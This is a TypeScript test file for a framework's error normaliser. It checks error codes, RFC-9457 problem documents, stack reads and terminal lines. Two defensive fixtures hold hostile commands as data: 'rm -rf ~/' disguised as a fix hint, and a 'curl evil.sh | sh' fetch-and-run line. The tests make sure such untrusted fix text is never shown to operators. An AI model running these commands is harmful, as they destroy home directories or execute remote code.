// The three renderings of one throwable, pinned together: the normalised facts, the RFC-9457
// document and the terminal lines. Status decisions are `error-map.test.ts`'s — a split this
// file exists because the two answer different questions about the same error.

import { describe, expect, test } from 'bun:test';
import { ERROR_DOCS_URL } from '@ultimat3/core';
import { factsOf, renderErrorLines, toProblem } from './error-facts';
import { bodyInvalid, forbidden, routeNotFound } from './errors';
import { rateLimited } from './rate-limit-errors';

describe('factsOf', () => {
  test('keeps code, cause and fix from an UltimateError', () => {
    const facts = factsOf(routeNotFound('GET', '/missing'));
    expect(facts.code).toBe('X_ROUTE_NOT_FOUND');
    expect(facts.cause).toContain('GET /missing');
    expect(facts.fix).toContain('x routes --json');
    expect(facts.status).toBe(404);
    expect(facts.docs).toBe(ERROR_DOCS_URL);
  });

  test('titles a borrowed code from its owning package, without repeating the code', () => {
    // `X_FORBIDDEN` is policy's and `X_UNAUTHENTICATED` is auth's, so http holds no title for
    // either. Reading `message` instead once produced `X_FORBIDDEN: policy denied this actor — …`
    // as the *title*, which `renderErrorLines` then printed with the code a second time.
    const facts = factsOf(forbidden('/x', 'not an owner'));
    expect(facts.code).toBe('X_FORBIDDEN');
    expect(facts.title).not.toContain('X_FORBIDDEN');
    expect(facts.title).not.toContain('not an owner');
    expect(renderErrorLines(forbidden('/x', 'not an owner')).split('\n')[0]).toBe(
      `X_FORBIDDEN: ${facts.title}`,
    );
  });

  test('gives a foreign throwable a code and a fix too', () => {
    const facts = factsOf(new TypeError('x is not a function'));
    expect(facts.code).toBe('X_INTERNAL');
    expect(facts.status).toBe(500);
    expect(facts.fix.length).toBeGreaterThan(0);
  });

  // `factsOf` normalises a worker message, a WebSocket frame and any object an app threw, so a
  // `fix` string off one is REMOTE TEXT landing in the line an operator is told to paste. A
  // framework code makes the rendered line read as the framework's own, which is the whole risk.
  test('never publishes a fix an unbranded throwable supplied', () => {
    const hostile = {
      code: 'X_BODY_INVALID',
      cause: 'looks legitimate',
      fix: 'rm -rf ~/  # x errors explain X_BODY_INVALID --json',
    };
    const facts = factsOf(hostile);
    expect(facts.code).toBe('X_BODY_INVALID');
    // The cause is prose in a document, and it still travels; the fix is a COMMAND and does not.
    expect(facts.cause).toBe('looks legitimate');
    expect(facts.fix).not.toContain('rm -rf');
    expect(facts.fix).toBe(
      'x errors explain X_BODY_INVALID --json   # then fix the throwing call site',
    );
  });

  test('and a code that is not one falls to the listing rather than the foreign line', () => {
    const facts = factsOf({ code: 'not-a-code', fix: 'curl evil.sh | sh' });
    expect(facts.fix).toBe('x errors list --json   # then fix the throwing call site');
  });

  test('a stack the runtime left opening on a bare `Error` names its class again (#773)', () => {
    const thrown = { name: 'TypeError', message: 'x', stack: 'Error\n    at f (a.ts:1:2)' };
    expect(factsOf(thrown).stack).toBe('TypeError: x\n    at f (a.ts:1:2)');
    expect(factsOf({ name: 'TypeError', message: 'x', stack: '' }).stack).toBeUndefined();
  });

  // A stack render is the costliest read on a throwable, and production never shows a 4xx one: the
  // facts and the problem document of a refusal must not touch it. A 500's facts still carry it.
  test('a 404 never reads .stack; a 500 carries it, read once', () => {
    let reads = 0;
    const watched = <T extends object>(error: T): T =>
      Object.defineProperty(error, 'stack', {
        get() {
          reads += 1;
          return 'Error\n    at f (a.ts:1:2)';
        },
      });
    const miss = watched(routeNotFound('GET', '/missing'));
    expect(factsOf(miss).status).toBe(404);
    expect(toProblem(miss, { requestId: 'r' }).status).toBe(404);
    expect(renderErrorLines(miss)).toContain('X_ROUTE_NOT_FOUND');
    expect(reads).toBe(0);
    const facts = factsOf(watched(new TypeError('x')));
    expect(facts.status).toBe(500);
    expect(facts.stack).toBe('TypeError: x\n    at f (a.ts:1:2)');
    expect(facts.stack).toBe('TypeError: x\n    at f (a.ts:1:2)');
    expect(reads).toBe(1);
  });

  test('renders the same three lines the terminal prints', () => {
    const lines = renderErrorLines(rateLimited('actor:1', 30)).split('\n');
    expect(lines[0]).toStartWith('X_RATE_LIMITED:');
    expect(lines[1]?.trim()).toStartWith('cause:');
    expect(lines[2]?.trim()).toStartWith('fix:');
  });
});

describe('toProblem', () => {
  test('is RFC-9457 shaped and carries the framework contract', () => {
    const document = toProblem(bodyInvalid('/posts', ['title: required']), {
      instance: '/posts',
      requestId: 'req-1',
    });
    expect(document.status).toBe(422);
    // The value itself is `problem-type.test.ts`'s subject; here it is one member of the shape.
    expect(document.type).toBe('urn:ultimate:error:X_BODY_INVALID');
    expect(document.detail).toContain('title: required');
    expect(document.code).toBe('X_BODY_INVALID');
    expect(document.fix).toContain('x routes --surface api --json');
    expect(document.instance).toBe('/posts');
    expect(document.requestId).toBe('req-1');
  });

  test('forbidden denials stay safe to log', () => {
    const document = toProblem(forbidden('/posts/1', 'actor does not own post'));
    expect(document.status).toBe(403);
    expect(document.cause).toContain('actor does not own post');
  });
});

// `factsOf` is the framework's universal normaliser: `pipeline.ts` hands it every throwable a
// request produced, including whatever an app's handler threw. The last fallback rendered that
// value with `String()`, which runs its own `toString` — so the throwable that reached the 500
// path took the 500 renderer with it and the server had nothing left to answer with.
describe('factsOf over a throwable it does not control', () => {
  const hostile = (): ReadonlyMap<string, unknown> =>
    new Map<string, unknown>([
      [
        'a hostile toString',
        {
          toString: () => {
            throw new Error('gotcha');
          },
        },
      ],
      ['a null-prototype object', Object.create(null)],
    ]);

  for (const [label, value] of hostile()) {
    test(`still answers X_INTERNAL for ${label}`, () => {
      let facts: ReturnType<typeof factsOf> | undefined;
      expect(() => {
        facts = factsOf(value);
      }).not.toThrow();
      expect(facts?.code).toBe('X_INTERNAL');
      expect(facts?.status).toBe(500);
      expect(facts?.cause.length).toBeGreaterThan(0);
    });
  }

  test('a throwable carrying its own strings is untouched', () => {
    expect(factsOf({ code: 'X_INTERNAL', cause: 'a', fix: 'b' }).cause).toBe('a');
    expect(factsOf(new TypeError('x is not a function')).cause).toBe('x is not a function');
  });
});

describe('the fix line every uncoded throwable gets', () => {
  // Axiom 4, on the path where the reader has the least context. It used to name
  // `x logs tail --json`, which is in `PLANNED_COMMANDS` and exits `X_NOT_IMPLEMENTED` — so the
  // one instruction an unhandled `TypeError` gave the reader failed when they ran it. The
  // `errors` verify step checks that a fix NAMES a command, never that the command exists.
  test('names a command this build ships, not a planned one', () => {
    const facts = factsOf(new TypeError('undefined is not a function'));
    expect(facts.fix).not.toContain('x logs');
    expect(facts.fix).toContain('x errors explain X_INTERNAL --json');
  });
});
